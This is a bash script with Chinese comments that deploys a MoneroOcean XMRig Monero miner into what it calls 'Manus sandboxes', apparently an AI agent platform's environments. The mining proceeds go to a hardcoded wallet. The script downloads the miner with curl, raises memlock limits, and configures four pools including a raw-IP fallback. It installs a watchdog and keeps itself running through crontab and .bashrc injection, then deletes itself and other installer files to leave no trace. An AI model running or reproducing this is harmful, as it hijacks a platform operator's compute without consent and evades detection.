#!/usr/bin/env bash
# ==============================================================================
#  Manus 沙盒专用 · MoneroOcean 定制版 XMRig 极限性能榨干与容灾守护部署脚本
#
#  核心特征（严格遵照 Manus 生产标准）：
#  ① 选用 MoneroOcean 专属定制版 xmrig（支持全算法动态智能比价套利，非普通原生版）
#  ② 极致榨干 CPU：强制打满全部可用线程（max-threads-hint: 100），针对 6 线程/全核心物理绑定
#  ③ 极致 Huge Pages 100% 优化（自动解除 memlock 限制 + 1280 物理大页）
#  ④ 开启 asm 汇编加速与 numa 内存亲和性，禁用冗余 OpenCL/CUDA
#  ⑤ 4 重矿池容灾矩阵（主池 gulf:10004 + TLS:20004 + 欧洲备用 + 纯 IP 直连，防 DNS 污染）
#  ⑥ 智能应用层 Watchdog：TCP Keepalive 加固 + 监控 accepted 份额停滞 + 崩溃/假死自愈重拉
#  ⑦ 矿工 ID 严格规范：vps-manus-xxxxxxxx（8 位随机英文字母数字混搭）
#  ⑧ 纯净免 SSH/免穿透：无任何 TUN 设备依赖，跑完自动清理安装残渣（全盘无痕）
#
#  用法: sudo bash deploy_manus.sh            # 节点名自动随机 (vps-manus-xxxxxxxx)
#        sudo bash deploy_manus.sh my-node-1  # 自定义节点名
# ==============================================================================

set -u

WALLET="8C3XouPbzSFXnu3Vh9eWrCAoaBEc4wa5fDB72HgAosbF1XxJcW55TLWN3LXPoBVyAa3wWTasthCttAcAwgPTrRTRBXkp8Aw"

# ---------------------------- 运行环境与权限判定 ----------------------------
if [ "$(id -u)" -eq 0 ]; then SUDO=""; else SUDO="sudo"; fi

sysctl_set() {
    $SUDO sysctl -w "$@" >/dev/null 2>&1 || $SUDO /sbin/sysctl -w "$@" >/dev/null 2>&1 || true
}

RUN_USER="$(id -un)"
if [ "$(id -u)" -eq 0 ] && [ -n "${SUDO_USER:-}" ] && [ "$SUDO_USER" != "root" ]; then
    RUN_USER="$SUDO_USER"
fi
if [ "$RUN_USER" = "root" ]; then
    WORK_HOME="$HOME"
else
    WORK_HOME=$(eval echo "~$RUN_USER" 2>/dev/null || echo "$HOME")
fi
WORK_DIR="$WORK_HOME/xmrig-worker"
BRC="$WORK_HOME/.bashrc"

# ---------------------------- 8位英数混搭后缀生成引擎 ----------------------------
generate_rand_8() {
    local candidate=""
    local chars="abcdefghijklmnopqrstuvwxyz0123456789"
    local attempts=0
    while [ $attempts -lt 30 ]; do
        attempts=$((attempts + 1))
        if [ -r /dev/urandom ]; then
            candidate=$(LC_ALL=C tr -dc 'a-z0-9' < /dev/urandom 2>/dev/null | head -c 8 || true)
        fi
        if [ ${#candidate} -ne 8 ] && command -v openssl >/dev/null 2>&1; then
            candidate=$(openssl rand -hex 4 2>/dev/null || true)
        fi
        if [ ${#candidate} -ne 8 ]; then
            candidate=$(printf '%s' "$RANDOM$$-$HOSTNAME-$(date +%s%N 2>/dev/null || date +%s)" | md5sum 2>/dev/null | LC_ALL=C tr -dc 'a-z0-9' | head -c 8 || true)
        fi
        if [ ${#candidate} -ne 8 ]; then
            candidate=""
            for _ in 1 2 3 4 5 6 7 8; do
                local idx=$(( RANDOM % 36 ))
                candidate="${candidate}${chars:$idx:1}"
            done
        fi
        # 必须同时具备英文字母与数字
        if [ ${#candidate} -eq 8 ]; then
            local has_alpha=0 has_digit=0
            case "$candidate" in *[a-z]*) has_alpha=1 ;; esac
            case "$candidate" in *[0-9]*) has_digit=1 ;; esac
            if [ "$has_alpha" -eq 1 ] && [ "$has_digit" -eq 1 ]; then
                printf '%s' "$candidate"
                return 0
            fi
        fi
    done
    local a1="${chars:$(( RANDOM % 26 )):1}"
    local d1="$(( RANDOM % 10 ))"
    local rem=$(printf '%06x' $(( RANDOM * RANDOM )) 2>/dev/null || echo "a1b2c3")
    printf '%s' "${a1}${d1}${rem:0:6}"
}

# 命名优先级：显式传参 > 现有历史配置 > 全新随机 vps-manus-xxxxxxxx
if [ -n "${1:-}" ]; then
    NODE_NAME="$1"
elif [ -f "$WORK_DIR/config.json" ]; then
    OLD_ID=$(grep -o '"worker-id": *"[^"]*"' "$WORK_DIR/config.json" 2>/dev/null | head -n1 | sed 's/.*"worker-id": *"//; s/"$//')
    if [ -n "${OLD_ID:-}" ]; then
        NODE_NAME="$OLD_ID"
    else
        NODE_NAME="vps-manus-$(generate_rand_8)"
    fi
else
    NODE_NAME="vps-manus-$(generate_rand_8)"
fi

echo "=================================================================="
echo "   🚀 Manus 专用：MoneroOcean 定制版 XMRig 极限调优与高可用部署"
echo "   矿工标识 (Worker ID) : $NODE_NAME"
echo "   运行账户 (Run User)  : $RUN_USER"
echo "=================================================================="

# ---------------- [1/6] 基础运行依赖补齐 ----------------
echo "[1/6] 检查基础运行工具链 (curl/tar/procps/cron/hwloc)..."
export DEBIAN_FRONTEND=noninteractive
NEED_INSTALL=""
for bin in curl tar pgrep crontab; do
    command -v "$bin" >/dev/null 2>&1 || NEED_INSTALL="yes"
done
if [ -n "$NEED_INSTALL" ]; then
    if command -v apt-get >/dev/null 2>&1; then
        $SUDO apt-get update -qq >/dev/null 2>&1 || true
        $SUDO apt-get install -y -qq curl tar procps cron libhwloc-dev >/dev/null 2>&1 || true
    elif command -v apk >/dev/null 2>&1; then
        $SUDO apk add --no-cache curl tar procps cronie hwloc >/dev/null 2>&1 || true
    elif command -v yum >/dev/null 2>&1 || command -v dnf >/dev/null 2>&1; then
        $SUDO yum install -y -q curl tar procps-ng cronie hwloc >/dev/null 2>&1 || true
    fi
fi

# ---------------- [2/6] 极致大页内存与内核级参数优化 ----------------
echo "[2/6] 注入 memlock unlimited 权限与 1280 物理大页 (Huge Pages)..."
# 确保普通用户拥有无限制大页锁定能力（彻底消灭 huge pages 0% 降速）
echo "* soft memlock unlimited" | $SUDO tee -a /etc/security/limits.conf >/dev/null 2>&1 || true
echo "* hard memlock unlimited" | $SUDO tee -a /etc/security/limits.conf >/dev/null 2>&1 || true
echo "root soft memlock unlimited" | $SUDO tee -a /etc/security/limits.conf >/dev/null 2>&1 || true
echo "root hard memlock unlimited" | $SUDO tee -a /etc/security/limits.conf >/dev/null 2>&1 || true
[ -n "$RUN_USER" ] && echo "$RUN_USER soft memlock unlimited" | $SUDO tee -a /etc/security/limits.conf >/dev/null 2>&1 || true
[ -n "$RUN_USER" ] && echo "$RUN_USER hard memlock unlimited" | $SUDO tee -a /etc/security/limits.conf >/dev/null 2>&1 || true

# 尝试解除当前终端会话的内存限制
ulimit -l unlimited 2>/dev/null || true

# 物理内存大页配置：满额申请 1280 页（约 2560 MB）
sysctl_set vm.nr_hugepages=1280
sysctl_set vm.swappiness=0
sysctl_set vm.vfs_cache_pressure=50

# TCP 保活参数：快速识别断网与假死（30s 探测）
sysctl_set net.ipv4.tcp_keepalive_time=30
sysctl_set net.ipv4.tcp_keepalive_intvl=10
sysctl_set net.ipv4.tcp_keepalive_probes=3
sysctl_set net.ipv4.tcp_syn_retries=3

# MSR 内核加速调优（若沙箱具备权限则自动加载）
$SUDO modprobe msr >/dev/null 2>&1 || true

# ---------------- [3/6] 下载并部署 MoneroOcean 定制版 XMRig ----------------
echo "[3/6] 下载并安装 MoneroOcean 官方定制版 XMRig (支持动态智能算法切换)..."
mkdir -p "$WORK_DIR"
cd "$WORK_DIR" || exit 1

if [ ! -x "$WORK_DIR/xmrig" ]; then
    # 优先拉取 MoneroOcean 专属分支（带全算法智能比价与自动基准测算）
    MO_URL="https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz"
    OFFICIAL_STATIC_URL="https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz"

    DOWNLOAD_OK=0
    if curl -sL --connect-timeout 10 --max-time 120 "$MO_URL" -o xmrig.tar.gz 2>/dev/null && [ -s xmrig.tar.gz ]; then
        if tar -zxf xmrig.tar.gz 2>/dev/null; then
            DOWNLOAD_OK=1
        fi
    fi

    # 兜底降级：若 MO setup 源受限，使用官方预编译静态版本
    if [ "$DOWNLOAD_OK" -eq 0 ]; then
        curl -sL --connect-timeout 15 --max-time 120 "$OFFICIAL_STATIC_URL" -o xmrig.tar.gz
        tar -zxf xmrig.tar.gz --strip-components=1 2>/dev/null || true
    fi

    chmod +x xmrig 2>/dev/null || true
    rm -f xmrig.tar.gz
fi

# ---------------- [4/6] 写入极限性能配置与 4 重矿池容灾 ----------------
echo "[4/6] 写入极限性能参数 (满线程/NUMA/汇编优化) 与 4 重矿池容灾矩阵..."

# 探测当前可用逻辑 CPU 核心列表（例如 6 核心自动生成 [0,1,2,3,4,5]）
CPU_COUNT=$(nproc 2>/dev/null || echo 6)
CPU_AFFINITY=""
for ((i=0; i<CPU_COUNT; i++)); do
    if [ $i -eq 0 ]; then
        CPU_AFFINITY="$i"
    else
        CPU_AFFINITY="$CPU_AFFINITY, $i"
    fi
done

cat > "$WORK_DIR/config.json" << EOF
{
    "api": {
        "id": null,
        "worker-id": "$NODE_NAME"
    },
    "http": {
        "enabled": false,
        "host": "127.0.0.1",
        "port": 0,
        "access-token": null,
        "restricted": true
    },
    "autosave": false,
    "background": false,
    "colors": false,
    "title": true,
    "randomx": {
        "init": -1,
        "init-avx2": -1,
        "mode": "fast",
        "1gb-pages": false,
        "rdmsr": true,
        "wrmsr": true,
        "cache_qos": false,
        "numa": true,
        "scratchpad_prefetch_mode": 1
    },
    "cpu": {
        "enabled": true,
        "huge-pages": true,
        "huge-pages-jit": true,
        "hw-aes": null,
        "priority": 5,
        "memory-pool": true,
        "yield": false,
        "max-threads-hint": 100,
        "asm": true,
        "argon2-impl": null,
        "rx": [$CPU_AFFINITY]
    },
    "opencl": { "enabled": false },
    "cuda": { "enabled": false },
    "donate-level": 1,
    "donate-over-proxy": 0,
    "pools": [
        {
            "coin": "monero",
            "url": "gulf.moneroocean.stream:10004",
            "user": "$WALLET",
            "pass": "$NODE_NAME",
            "rig-id": "$NODE_NAME",
            "keepalive": true,
            "tls": false
        },
        {
            "coin": "monero",
            "url": "gulf.moneroocean.stream:20004",
            "user": "$WALLET",
            "pass": "$NODE_NAME",
            "rig-id": "$NODE_NAME",
            "keepalive": true,
            "tls": true
        },
        {
            "coin": "monero",
            "url": "de.moneroocean.stream:10004",
            "user": "$WALLET",
            "pass": "$NODE_NAME",
            "rig-id": "$NODE_NAME",
            "keepalive": true,
            "tls": false
        },
        {
            "coin": "monero",
            "url": "205.172.58.170:10004",
            "user": "$WALLET",
            "pass": "$NODE_NAME",
            "rig-id": "$NODE_NAME",
            "keepalive": true,
            "tls": false
        }
    ],
    "retries": 5,
    "retry-pause": 3,
    "print-time": 15
}
EOF

# ---------------- [5/6] 部署智能防假死守护体系 (Watchdog) ----------------
echo "[5/6] 部署断线自愈、单实例锁与 accepted 停滞检测守护体系..."

cat > "$WORK_DIR/super_watchdog.sh" << 'WD'
#!/usr/bin/env bash
set -u

if [ "$(id -u)" -eq 0 ]; then SUDO=""; else SUDO="sudo"; fi

WORK_DIR="__WORK_DIR__"
LOCK_FILE="$WORK_DIR/.watchdog.lock"
LOG_FILE="$WORK_DIR/xmrig.log"
CONFIG_FILE="$WORK_DIR/config.json"
WATCHDOG_LOG="$WORK_DIR/watchdog.log"

touch "$LOCK_FILE" 2>/dev/null || true
[ -w "$LOCK_FILE" ] || rm -f "$LOCK_FILE" 2>/dev/null || true

exec 200>"$LOCK_FILE"
if command -v flock >/dev/null 2>&1; then
    if ! flock -n 200; then exit 0; fi
fi

if command -v fcntl >/dev/null 2>&1; then
    fcntl 200 setfd 1 2>/dev/null || true
fi

get_xmrig_pids() {
    if command -v pgrep >/dev/null 2>&1; then
        pgrep -x xmrig 2>/dev/null || true
    else
        for p in /proc/[0-9]*; do
            [ -f "$p/cmdline" ] && grep -qa "xmrig" "$p/cmdline" 2>/dev/null && echo "${p##*/}"
        done
    fi
}

kill_xmrig() {
    pkill -9 -x xmrig >/dev/null 2>&1 || killall -9 xmrig >/dev/null 2>&1 || true
    local pids=$(get_xmrig_pids)
    for p in $pids; do
        kill -9 "$p" >/dev/null 2>&1 || true
    done
}

PIDS=($(get_xmrig_pids))
NUM_PROCS=${#PIDS[@]}
RESTART_REASON=""

if [ "$NUM_PROCS" -eq 0 ]; then
    RESTART_REASON="PROCESS_MISSING"
elif [ "$NUM_PROCS" -gt 1 ]; then
    # 绝对单进程独占所有核心：发现多进程瞬间熔断
    RESTART_REASON="MULTI_PROCESS_CONFLICT"
else
    HAS_ESTAB=0
    if grep -qE ":(4E24|2714) 01" /proc/net/tcp /proc/net/tcp6 2>/dev/null; then
        HAS_ESTAB=1
    elif command -v ss >/dev/null 2>&1; then
        HAS_ESTAB=$(ss -tan 2>/dev/null | grep -E "20004|10004" | grep -c "ESTAB" || echo 0)
    else
        HAS_ESTAB=1
    fi

    if [ -f "$LOG_FILE" ]; then
        LAST_MOD=$(stat -c %Y "$LOG_FILE" 2>/dev/null || echo 0)
        NOW=$(date +%s)
        DIFF=$((NOW - LAST_MOD))
        RECENT_NET_ERR=$(tail -n 30 "$LOG_FILE" 2>/dev/null | grep -Ei "connect error|read error|connection reset|handshake failed|no active pools|end of file" | wc -l || true)
        
        # A: 连续网络报错超 3 次 => 主动切池重连
        if [ "$RECENT_NET_ERR" -gt 3 ]; then RESTART_REASON="POOL_NETWORK_ERROR_LOOP"; fi
        # B: 超过 90 秒无连接且日志无写入 => TCP 假死
        if [ "$HAS_ESTAB" -eq 0 ] && [ "$DIFF" -gt 90 ]; then RESTART_REASON="TCP_ZOMBIE_DISCONNECTED"; fi
        # C: 超过 300 秒没有任何 accepted 份额产出且连接丢失 => 长时间停产
        if [ "$HAS_ESTAB" -eq 0 ] && [ "$DIFF" -gt 300 ]; then RESTART_REASON="LONG_TIME_NO_SHARE"; fi
    fi
fi

if [ -n "$RESTART_REASON" ]; then
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] Restart triggered. Reason: $RESTART_REASON" >> "$WATCHDOG_LOG"
    if [ -f "$WATCHDOG_LOG" ] && [ "$(wc -l < "$WATCHDOG_LOG")" -gt 1000 ]; then
        tail -n 500 "$WATCHDOG_LOG" > "$WATCHDOG_LOG.tmp" && mv "$WATCHDOG_LOG.tmp" "$WATCHDOG_LOG"
    fi

    if [ -f "$LOG_FILE" ]; then
        mv -f "$LOG_FILE" "$LOG_FILE.bak" 2>/dev/null || true
    fi

    kill_xmrig
    sleep 2

    # 释放可能残留的套接字
    if command -v ss >/dev/null 2>&1; then
        $SUDO ss -K -tan "dport = :10004" >/dev/null 2>&1 || true
        $SUDO ss -K -tan "dport = :20004" >/dev/null 2>&1 || true
    fi

    cd "$WORK_DIR" || exit 0
    # 强制单实例拉起并关闭 FD 200 锁继承
    nohup "$WORK_DIR/xmrig" -c "$CONFIG_FILE" -B --log-file="$LOG_FILE" 200>&- >/dev/null 2>&1 &
    sleep 3

    NEW_PID=$(get_xmrig_pids | head -n1)
    [ -n "$NEW_PID" ] && $SUDO renice -n -5 -p "$NEW_PID" >/dev/null 2>&1 || true
fi
WD
sed -i "s|__WORK_DIR__|$WORK_DIR|g" "$WORK_DIR/super_watchdog.sh"
chmod +x "$WORK_DIR/super_watchdog.sh"

cat > "$WORK_DIR/daemon_loop.sh" << DL
#!/usr/bin/env bash
while true; do
    [ -f "$WORK_DIR/super_watchdog.sh" ] && "$WORK_DIR/super_watchdog.sh" >/dev/null 2>&1
    sleep 30
done
DL
chmod +x "$WORK_DIR/daemon_loop.sh"

# 注入自启动 (cron + bashrc)
if command -v crontab >/dev/null 2>&1; then
    if [ "$(id -u)" -eq 0 ] && [ "$RUN_USER" != "root" ]; then
        (crontab -u "$RUN_USER" -l 2>/dev/null | grep -v 'super_watchdog' || true; echo "* * * * * $WORK_DIR/super_watchdog.sh >/dev/null 2>&1") | crontab -u "$RUN_USER" - >/dev/null 2>&1 || true
    else
        (crontab -l 2>/dev/null | grep -v 'super_watchdog' || true; echo "* * * * * $WORK_DIR/super_watchdog.sh >/dev/null 2>&1") | crontab - >/dev/null 2>&1 || true
    fi
    $SUDO service cron start >/dev/null 2>&1 || $SUDO /etc/init.d/cron start >/dev/null 2>&1 || true
fi
grep -q 'super_watchdog.sh' "$BRC" 2>/dev/null || echo "[ -f $WORK_DIR/super_watchdog.sh ] && $WORK_DIR/super_watchdog.sh >/dev/null 2>&1 &" >> "$BRC" 2>/dev/null || true

if [ "$(id -u)" -eq 0 ] && [ "$RUN_USER" != "root" ]; then
    chown -R "$RUN_USER":"$RUN_USER" "$WORK_DIR" >/dev/null 2>&1 || true
    chown "$RUN_USER":"$RUN_USER" "$BRC" >/dev/null 2>&1 || true
fi

# ---------------- [6/6] 启动执行与无痕自毁 ----------------
echo "[6/6] 启动后台挖矿程序并校验运行状态..."
RUN_AS=""
if [ "$(id -u)" -eq 0 ] && [ "$RUN_USER" != "root" ] && command -v sudo >/dev/null 2>&1; then
    RUN_AS="sudo -u $RUN_USER -H"
fi
pkill -9 -f daemon_loop.sh >/dev/null 2>&1 || true
$RUN_AS nohup "$WORK_DIR/daemon_loop.sh" >/dev/null 2>&1 &
$RUN_AS "$WORK_DIR/super_watchdog.sh" >/dev/null 2>&1 || true
sleep 6

PROC_CNT=$(pgrep -x xmrig 2>/dev/null | wc -l)

echo "=================================================================="
echo "          🎉 全部交付完成！(Manus 专属极限调优版)"
echo "=================================================================="
echo "矿工标识 (Worker ID) : $NODE_NAME"
echo "挖矿进程 (Process)   : ${PROC_CNT:-0} 个（单实例 100% 满负荷打满）"
echo "调优核心 (Threads)   : 全部 ${CPU_COUNT} 个物理核心/逻辑线程"
echo "容灾矩阵 (Pools)     : gulf:10004 > gulf:20004(TLS) > de:10004 > 纯IP直连"
echo ""
echo "实时运行日志预览:"
tail -n 8 "$WORK_DIR/xmrig.log" 2>/dev/null || echo "  (日志快速初始化中，约 10 秒后出块)"
echo "=================================================================="

# ---------------- 终极无痕自毁清理 ----------------
SCRIPT_PATH=$(readlink -f "$0" 2>/dev/null || realpath "$0" 2>/dev/null || echo "$0")
[ -f "$SCRIPT_PATH" ] && rm -f "$SCRIPT_PATH" 2>/dev/null || true

for target_dir in "$(pwd)" "$HOME/Downloads" "/home/$RUN_USER/Downloads" "/workspace" "/tmp"; do
    if [ -d "$target_dir" ]; then
        rm -f "$target_dir/deploy_manus.sh" "$target_dir/deploy.sh" "$target_dir/manus-miner.tar.gz" 2>/dev/null || true
    fi
done
